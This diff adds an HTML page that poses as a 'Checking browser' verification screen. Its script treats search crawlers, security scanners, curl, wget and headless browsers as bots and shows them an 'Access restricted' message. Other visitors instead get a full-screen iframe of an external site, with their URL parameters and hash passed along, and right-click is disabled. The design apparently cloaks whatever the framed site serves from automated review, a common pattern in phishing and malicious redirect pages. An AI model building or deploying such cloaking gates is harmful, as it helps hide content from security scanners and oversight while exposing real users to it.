@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verifying…</title>
+
+  <!-- Basic security headers -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://mfe-fr.com/wp/; frame-src https://mfe-fr.com/wp/; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src 'self' data:;">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      background: #0f0f0f;
+      color: #e0e0e0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+    #gate {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      text-align: center;
+      padding: 20px;
+    }
+    #gate h1 {
+      font-size: 1.4rem;
+      font-weight: 500;
+      margin-bottom: 12px;
+    }
+    #gate p {
+      font-size: 0.95rem;
+      opacity: 0.7;
+      margin-bottom: 24px;
+    }
+    .spinner {
+      width: 36px;
+      height: 36px;
+      border: 3px solid rgba(255,255,255,0.15);
+      border-top-color: #4ade80;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    iframe {
+      border: none;
+      width: 100%;
+      height: 100%;
+      display: none;
+    }
+    .blocked {
+      color: #f87171;
+    }
+  </style>
+</head>
+<body>
+  <div id="gate">
+    <div class="spinner" id="spinner"></div>
+    <h1 id="status">Checking browser…</h1>
+    <p id="message">Please wait a moment while we verify your connection.</p>
+  </div>
+
+  <iframe id="content" title="Content" allowfullscreen sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation-by-user-activation"></iframe>
+
+  <script>
+    (function () {
+      "use strict";
+
+      var DESTINATION = "https://mfe-fr.com/wp/";
+
+      var gate = document.getElementById("gate");
+      var statusEl = document.getElementById("status");
+      var messageEl = document.getElementById("message");
+      var spinner = document.getElementById("spinner");
+      var iframe = document.getElementById("content");
+
+      // === Basic Bot Detection ===
+      function isLikelyBot() {
+        if (navigator.webdriver === true) return true;
+        if (window.callPhantom || window._phantom || window.__nightmare) return true;
+        if (window.Buffer) return true;
+
+        var ua = (navigator.userAgent || "").toLowerCase();
+        var botPatterns = [
+          "bot", "crawl", "spider", "slurp", "mediapartners",
+          "googlebot", "bingbot", "yandex", "baidu", "duckduck",
+          "facebookexternalhit", "twitterbot", "linkedinbot",
+          "headless", "phantomjs", "selenium", "puppeteer", "playwright",
+          "curl", "wget", "python-requests", "java/", "libwww",
+          "httpclient", "scrapy", "httpx", "go-http-client"
+        ];
+        for (var i = 0; i < botPatterns.length; i++) {
+          if (ua.indexOf(botPatterns[i]) !== -1) return true;
+        }
+
+        if (!navigator.languages || navigator.languages.length === 0) return true;
+        if (window.screen && (window.screen.width === 0 || window.screen.height === 0)) return true;
+
+        return false;
+      }
+
+      // === Build final target URL (preserve params + hash) ===
+      function buildTarget() {
+        var target = DESTINATION;
+        var incoming = window.location.search;
+        var hash = window.location.hash;
+
+        if (incoming) {
+          target += (DESTINATION.indexOf("?") > -1 ? "&" : "?") + incoming.substring(1);
+        }
+        target += hash;
+        return target;
+      }
+
+      // === Load content immediately ===
+      function loadContent() {
+        iframe.src = buildTarget();
+        iframe.style.display = "block";
+        gate.style.display = "none";
+      }
+
+      // === Blocked UI ===
+      function showBlocked(reason) {
+        spinner.style.display = "none";
+        statusEl.textContent = "Access restricted";
+        statusEl.classList.add("blocked");
+        messageEl.textContent = reason || "Automated access is not allowed.";
+      }
+
+      // === Main ===
+      if (isLikelyBot()) {
+        showBlocked("Automated traffic detected.");
+      } else {
+        loadContent(); // auto load with no delay
+      }
+
+      // Disable context menu while gate is visible
+      document.addEventListener("contextmenu", function (e) {
+        if (gate.style.display !== "none") e.preventDefault();
+      });
+
+    })();
+  </script>
+</body>
+</html>
